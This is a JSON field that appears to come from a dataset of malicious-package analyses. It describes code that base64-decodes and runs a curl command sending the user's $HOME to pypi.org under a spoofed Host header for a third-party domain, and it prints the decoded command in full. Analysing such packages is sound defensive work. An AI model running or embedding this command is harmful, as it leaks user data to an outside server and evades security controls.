      "malicious_behavior": "The code decodes a base64-encoded string that contains a curl command and executes it using os.system. The decoded command is: curl -k -X POST \"https://pypi.org\" -H \"Host: psec.forward.io.global.prod.fastly.net\" -d \"test=$HOME\". This command sends a POST request to https://pypi.org with a custom Host header pointing to a third-party domain (psec.forward.io.global.prod.fastly.net) and includes the environment variable $HOME in the POST data. This behavior can be considered malicious because it leaks potentially sensitive environment information (the user's home directory path) to an external server, which could be used for reconnaissance or further attacks. Additionally, the use of a custom Host header to redirect the request to a different domain is suspicious and may be an attempt to bypass security controls or perform a DNS rebinding attack.",
